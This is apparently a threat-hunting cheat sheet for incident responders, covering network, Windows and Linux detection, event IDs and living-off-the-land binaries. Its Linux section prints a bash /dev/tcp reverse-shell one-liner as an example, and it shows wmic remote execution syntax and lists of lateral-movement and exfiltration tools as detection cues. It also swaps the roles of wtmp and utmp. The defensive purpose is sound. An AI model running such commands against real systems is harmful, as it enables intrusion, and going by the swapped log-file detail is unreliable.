Threat Hunt Categories  
  
[Questions for the Customer](#questions-for-the-customer)  
[Non-OS Threat Detection](#non-os-specific-threat-detection)  
[OS Agnostic Detections](#os-agnostic-detections)  
  
Windows  
* [Lateral Movement](#detecting-lateral-movement-in-windows)   
* [Remote Code Execution](#remote-code-execution)  
* [Event Log Analysis](#event-log-analysis)  
* [Signs of Living off the Land](#signs-of-living-off-the-land)  
* [Detecting Persistence](#detecting-persistence-in-windows)  
* [Detect system process anomalies that deviate from normal](#detect-system-process-anomalies-that-deviate-from-normal)  

Linux  
* [Threat Hunting](#detecting-lateral-movement-in-linux)   

## Questions for the Customer
1. How do the system administrators interact with servers, and from where?  
  * psexec, rdp, winrm, powershell, ssh, others?
2. Which accounts have membership in privileged groups, and which groups?  
3. What remote execution tools are commonly used in this environment?  
4. Which UserAgent strings are common here?  
5. Where are the most sensitive pieces of data stored, and how do users normally access that data?  
6. What are typical levels of server-to-workstation, server-to-browser, and workstation-to-server lateral movement?  
  
## Non-OS Specific threat detection

Namespace Collisions
* Internal DNS names are not controlled externally
* Create a list of domains from DNS used by the clients for the org. Who owns their IP resolution?
* Search if wpad.dat reaches external organizations
* Search for domains outside com, net, org, gov, mil, edu

DNS
* High numbers of subdomains or large TXT fields to find DNS tunnelling
* Find queries with long query names e.g. hunt against 2 stddev or length > 200 . 
* Search for destinations of dynamic dns domains
* High volumes of NXDOMAIN errors and high subdomain name entropy could signify use of a DGA
* Search for typos of domains being accessed against owned domains. See levenstein algorithm  
* New domains at a weight in determining maliciousness 
* Bro's bro_weird log. name=dns_unmatched_reply dest_port=53  
* Find clients connecting to multiple DNS servers  
* External addresses resolving to 127.0.0.1 could be parked domains 
  
Proxy
* Consistent and reoccurring HTTP PUT
* Suspicious user-agents such as powershell especially PUT. See Neo23x0\Sigma for UA's
* Malicious domains often are set as uncategorized by proxies
  * Unsolicited outbound communication to the hostile domain with no referrer
  * Reputation of the domain

Netflow
* Unusual volumes and frequencies
* Compare to a general baseline
* Compare against TOR exit nodes or other 

Existing Hostname and IP Blocks. e.g. firewall, DNS, AV, IPS
* Blocks may not reach the intended target, but they might indicate an infected source in the company
* Pivot back to the endpoint and check 

NSM / deep packet inspection
* Port number does not match the protocol contained within
  * Search protocol metadata, exclude matched protocols, and search
  * Search for ports used that aren't registered with IANA
  * Encryption on typically non-encrypted port numbers
  * Pivot off ASN, User-Agent, x.509 Certificate Subject and Issuer
  
## OS Agnostic Detections

Processes
* Invalid parent-child relationship
* Invalid number of running instances of a system process
* Suspicious command-line arguments or flags to a service or executable
* Questions to consider  
 * What was the application and its metadata?  
 * Was it recorded during a known operational window?  
 * Was a valid account associated with the execution, and was this account used during a normal operational window?  
 * Was the process associated with network activity?  
  
Persistence  
* Which accounts are modifying persistence mechanisms on MacOS systems?  
* Which persistent objects are signed versus unsigned?  
* Do any persistent objects have a history of initiating network connections?  
* Across the enterprise, which logon scripts are being used when authentication succeeds?  
* Which device drivers are persistent?  
  
  
## Detecting Lateral Movement in Windows
  
Detailed tools execution and the artifacts they create at https://jpcertcc.github.io/ToolAnalysisResultSheet/
* Command Execution
* Password and hash dumps
* Remote login
* PTH, PTT
* Privilege Escalation
* Capturing domain rights
* Local user/group changes
* File sharing
* Evidence deletion
* Information Collection  
  
__My techniques collected outside of the JP CERT website are as follows.__  
  
In most scenarios, use VSSAdmin if your data source does not contain your date range  
  
### Remote Code Execution  
  
* Remote code execution
  * Execution of PsExec
    * psexec sends stdin/stdout/stderr sent over IPC with SMB 
    * mounts hidden $ADMIN or $IPC, copies psexesvc.exe remotely, starts the service and exec command
	  * Named pipes used to communicate
	  * artifacts: app exec, pushed binaries, user profile creation w/o -e
	  * Registry: service registration and EulaAccepted  
    * Initiated with a 5145 then 5140 with $ADMIN or $IPC to test permission
    * Service creation with 4697 and 7045. Execution captured in 4688.
  
  * Windows Remote Mgmt Tools for local or remote
    * sc.exe, schtasks.exe, at.exe, reg.exe, winrs.exe (remote command)
      * Found in authentications, services system log, task scheduler logs, CL auditing
      * Scheduled tasks
      * AT -> \Windows\System32\Tasks  schtasks are XML
      * See evtlog Task Scheduler\Operational (eventid below)
      * schtasks entry injects remote host/user as Author
  
  * Powershell Remoting, WMIC, WinRM, RPC
    * Usage = wmic /node:host /user:user process call create "command"
    * Other powershell procedures = Invoke-WmiMethod, Invoke-Command, Enter-PSSession
    * Detect execution of wmiprvse.exe, powershell.exe, wsmprovhost.exe
    * Must turn on command line auditing for detection 
  
  * RDP/VPN Activity
    * Event logs record inbound RDP activity
    * Registry contains recent RDP client activity
    
  * Samba activity
    * In a domain, look for client's in a workgroups accessing Samba 
  
  * Finding code execution without EDR recording or sysmon  
    * Check the Prefetch and Shimcache  
    * Get-ForensicPrefetch: file execution forensics  
    * Get-ForensicShimcache: AppCompatCache forensics  
    
  * Kerberoasting
    * Dumps hashes from services
    * Query for executions of RunAs 
    * TGS-REQ packets with RC4 encryption
    * Enable “Audit Kerberos Service Ticket Operations” and search for users with excessive 4769 events 

Monitoring for numerous Kerberos service ticket requests in Active Directory is possible by enabling Kerberos service ticket request monitoring (“Audit Kerberos Service Ticket Operations”) and searching for users with excessive 4769 events (Event Id 4769 “A Kerberos service ticket was requested”).  
### Event Log Analysis  
  
* Account Misuse
  * Find use of mapped admin shares
    * Shellbags or ntuser.dat's MountPoints2 for use of C$, ADMIN$
    * Staging malware or accessing sensitive files
    * Vista or later requires domain or built-in admin rights
  * Logon using RunAs (eventid below)
  * Track admin activity where special logon 4672 == an administrative account  
  * Domain Admin anomalies
  * New accounts created locally or administrative rights granted to existing (eventid below)  
  * Workstation to workstation connections based off hostname/ip lookups
  * Pass the Hash (PTH): 4776 from local account with 4624 showing network logon
  * Kerberos TGT/TS
    * Use klist.exe to list session details and determine if time is > MaxTicketAge
    * Domain field in 4624, 4634, 4672 should be the shortname
  * Account logs into many remote hosts in too short a time
  
* Suspicious Services
  * Locate services run outside of service accounts	
  * Reference an executable in a non-standard directory
  * Blank fields which normally hold values
  * New service installed (eventid below)
  * Set to a stopped state (eventid below)
  * Service crashed (eventid below)
  * Setup with a Service Failure Recovery binary to run if service fails
  
* Crashes and security alerts
* Cleared out audit logs (eventid below)
* Detect ticket reuse
  * See JPCert URL linked at the top

* Common EventID Meanings  
  
528,4624 - Successful Logon  
529,4625 - Failed Logon  
4634,4647 Successful Logoff  
552,4648 - Logon using RunAs credentials  
4672 - Admin login / Special login  
  
Terminal services log id 21,24,25  
  
4776 - On DC, success/fail during hash authentication  
  
5140 - Network share was accessed  
5145 - Shared object access (detailed within)  
  
201 - Schtask executed  
602,4698,4699,4702, - Schtask created, deleted, updated  
4700/4701 - Schtask enabled/disabled  
  
4720 - Account created  
4762 - Assignment of Administrator Rights  
4768/4769 - Domain account authentication (per TGS request)   
4771 - Logon Error for Kerberos (very detailed reason)  
4778/4779 - Session create/close (RDP)  
  
7034 - Service crashed  
7035 - Service sent start/stop  
7036 - Service started/stopped  
7040 - Start type changed  
7045 - service installed first time (win2008R2)  
601,4697 - service installed on system  
  
1033/1034 - App install/remove  
11707/11708 - Install success/fail  
11724 - Uninstall completely removed  
  
4688 - Process created (if process tracking on, turn on command-line auditing)  
  
1102 - Audit log cleared (Security)  
104 - Audit log cleared (System)  
  
Details and examples Windows OS commands below can be found at https://github.com/api0cradle/LOLBAS/tree/master/OSBinaries  
  
## Signs of Living off the Land  
  
### Signs of lateral movement
inrs.exe, nc.exe, mstsc.exe, netcat.exe, psexec.exe, wmic.exe . 
  
### Signs of exfiltration  
bitsadmin.exe, esentutl.exe, expand.exe, extrac32.exe, forfiles.exe, ftp.exe, makecab.exe, net.exe, net1.exe, print.exe, rar.exe, replace.exe, robocopy.exe, wmic.exe, xcopy.exe, 7zip.exe, 7za.exe *-mhe=on*, zip *--encrypt*
  
### Signs of Intelligence Gathering
dcdiag.exe, diskshadow.exe, dsquery.exe, dumpel.exe, findstr.exe, forfiles.exe, gpresult.exe, hostname.exe, ipconfig.exe, ldifde.exe, nbtstat.exe, net1.exe, net.exe, netstat.exe -ano, nltest.exe, nslookup.exe, ntdsutil.exe, ping.exe, powershell.exe, procdump.exe, psloggedon.exe, psr.exe, query.exe, quser.exe, rdpclip.exe, reg.exe, route.exe, rpcping.exe, systeminfo.exe, tasklist (tasklist /v).exe, ver.exe, vssadmin.exe, whoami.exe, wmic.exe  
  
### Signs of DLL/File Execution 
7za.exe *-mhe=on*, at.exe, atbroker.exe, bitsadmin.exe, cmd.exe, cmdkey.exe, cmstp.exe, control.exe, csc.exe, cscript.exe, curl.exe, csvde.exe, dfsvc.exe, dnscmd.exe, extexport.exe, ieexec.exe, installutil.exe, mavinject.exe, msbuild.exe, msconfig.exe, msdt.exe, msiexec.exe, mshta.exe, net1.exe, net.exe, netsh.exe, openwith.exe, pcalua.exe, powershell.exe, psexec.exe, regasm.exe, regsvcs.exe, regsvr32.exe, rundll32.exe, runonce.exe, sc.exe, schtasks.exe, scriptrunner.exe, sdelete.exe, taskkill.exe, winword.exe /L, wmic.exe, wscript.exe, xwizard.exe
  
## Detecting Persistence in Windows  
* AutoRun locations  
* Windows Services  
* Image file execution options  
* Application Debuggers  
* Registered COM servers  
* Registry entries with null characters or that contain binary . 
  
Fileless attack Persistence  
* Storing shellcode within a registry key value, executed by a generally benign Windows application  
* Storing a script within the WMI CIM executed by a script processor such as the Windows Script Host (WSH)  
* Using a PowerShell cmdlet to download malicious scripts and passing them to one of several utilities  
* Using stored procedures to perform inline compilation of C# or other code  
  
See: Beyond good ol' Run key series on the Hexacorn.com blog  

## Detect system process anomalies that deviate from normal
  
Below is the expected look of a healthy Windows system  
* smss.exe  
  * Location = %SystemRoot%\System32\  
  * Parent = System  
  * Instances = 1. Child processes of smss spawned 1 per session until login completes  
  * Owner = Local system  
* wininit.exe  
  * Location = %SystemRoot%\System32\wininit.exe  
  * Parent = <none> after smss.exe terminates  
  * Instances = 1  
  * Owner = Local System  
* taskhost.exe  
  * Location = %SystemRoot%\System32\taskhost.exe  
  * Parent = services.exe  
  * Instances = 1+  
  * Owner = Users + Services  
* lsass.exe  
  * Location = %SystemRoot%\System32\lsass.exe  
  * Parent = wininit.exe  
  * Instances = 1  
  * Owner = Local System  
* winlogon.exe  
  * Location = %SystemRoot%\System32\winlogon.exe  
  * Parent = none after smss.exe terminates  
  * Instances = 1+  
  * Owner = Local System  
* csrss.exe  
  * Location = %SystemRoot%\System32\csrss.exe  
  * Parent = none after smss.exe terminates  
  * Instances = 2+  
  * Owner = Local System  
* services.exe  
  * Location = %SystemRoot%\System32\services.exe  
  * Parent = wininit.exe  
  * Instances = 1  
  * Owner = Local System  
* svchost.exe  
  * Location = %SystemRoot%\System32\svchost.exe  
  * Parent = services.exe  
  * Instances = 5+  
  * Owner = Local System, Network Service, or Local Service  
* lsm.exe  
  * Location = %SystemRoot%\System32\lsm.exe  
  * Parent = wininit.exe  
  * Instances = 1  
  * Owner = Local System  
* explorer.exe  
  * Location = %SystemRoot%\explorer.exe  
  * Parent = none after userinit.exe terminates  
  * Instances = 1 per interactive logon  
  * Owner = User  
  
## Detecting Lateral Movement in Linux
  
* Determine timeframe of event  
  * External source  
  * Local log entries
  * Metadata change on file of interest
    * Check if atime is crippled with noatime, nodiratime, or relatime using “mount”
      *	Access and Modify times are easily altered
      *	Change times (metadata e.g. chown) are not easily timestomped
* Examine logins around the time of event 
  * Check the syslog configuration for log filenames. Below is typical.
    * /var/log/secure* or /var/log/auth*
    * /var/log/messages* or /var/log/syslog*
    * /var/log/*
  * Logins housed in a DB read with “last –f <filename>”
  * Current logins: /var/run/wtmp  
  * Historical logins/logouts: /var/log/utmp  
  * Failed logins: /var/log/btmp 
* Check bash history where bash is the user’s shell (ksh, csh differ)
  *	Assuming no timestamps are in USERHOME/.bash_history, you can do temporal searches based on the bash_history 
    last modify times knowing that was the most recent logout time.  
  *	Never assume bash_history is in execution order.  Two shells running commands at the same time will dump each
    of their history blocks only when that shell terminates.
  *	The file can be hand edited or removed by the user
  *	Suggest that the customer deploys bash history time stamps.
* Check timestamps within home directories
  *	Access time updates for .bash* or .profile can show login 
  *	Access time on .ssh/known_hosts shows ssh client outbound attempt
  *	Access time on .ssh/authorized_keys shows ssh inbound attempt as this HOMEDIR user
* Examine sudo logs around the time of the event (check syslog config for path)
  * Typically found within /var/log/secure* or /var/log/auth*
  * sudo rules are typically in /etc/sudoers and /etc/sudoers.d/*
  * sudo can run commands as root or as other users
* Examine sshd sessions around time of event  
  * Current logs: /var/log/secure  or /var/log/auth
  * Historical logs: /var/log/secure-YYYYMMDD 
* Check application logs
  * Typically do not log through syslog if the software was not installed by the package manager
  * Can exist anywhere on the system
  * LLR collections *.log off disk into otheroslogs.tar.gz but would skip *.log.gz
* Examine audit logs
  * /var/log/audit.log if installed and running
  * Contents are dependent on administrator’s custom configuration
  * ausearch is powerful for searching audit.log
  * aureport generates a report on audit.log
* If the image or access to the filesystem is available, use the Sleuthkit to make a timeline
  * fls –rd / > filedump.txt
  * mactime –b filedump.txt > filedump_mac.txt
* Look for signs of an adversary "Living off the land"
  * arp nmap ping who whoami traceroute nslookup dig telnet netstat lsof host ss route macchange ip tcpkill id getent wget curl shred touch openssl chattr gcc history iptables xwd
  * L.O.L. exampe: /bin/bash -c '/bin/sh 0</dev/tcp/192.168.56.103/12345 1>&0 2>&0' 2>&1
  
Sources:  
* Sqrrl Huntpedia PDF  
* Endgame Guide to Threat Hunting  
* JPCert Tool Analysis Report  
* SANS 508  
* SANS Finding Evil in the Whitelist  
